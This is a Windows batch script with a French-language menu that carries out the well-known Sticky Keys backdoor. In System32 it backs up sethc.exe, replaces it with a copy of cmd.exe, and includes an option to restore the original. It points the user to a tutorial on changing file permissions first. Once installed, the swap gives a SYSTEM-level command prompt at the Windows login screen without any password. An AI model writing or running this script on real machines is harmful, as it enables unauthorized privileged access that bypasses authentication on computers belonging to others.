@echo off

:menu
cls
set /p reponse=Que voulez vous faire (r : renomer fichiers;c : changer les fichiers;d : repasser au defauts;q : quitter)
if %reponse% == r goto :renommerfichiers
if %reponse% == c goto :changerfichiers
if %reponse% == d goto :defauts
if %reponse% == q goto :quitter

:renommerfichiers
cls
cd C:\Windows\System32
copy cmd.exe sethc.ex
copy sethc.exe sethc.old
echo.C'est fini
goto :menu

:changerfichiers
cls
echo.As tu suivi le tuto pour changer les autorisations de fichiers ??
pause.
cls
del sethc.exe
ren sethc.ex sethc.exe
echo.C'est fini
goto :menu

:defauts
cls
del sethc.exe
ren sethc.old sethc.exe
echo.C'est fini

:quitter
exit
